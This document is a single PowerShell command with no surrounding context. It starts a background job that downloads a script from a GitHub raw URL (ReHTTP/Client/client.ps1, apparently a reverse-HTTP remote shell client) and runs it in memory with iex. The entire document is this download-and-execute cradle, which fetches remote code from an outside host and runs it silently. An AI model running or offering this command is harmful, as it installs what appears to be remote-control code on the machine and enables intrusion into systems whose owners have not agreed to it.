Start-Job -ScriptBlock {iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jxroot/ReHTTP/master/Client/client.ps1')}
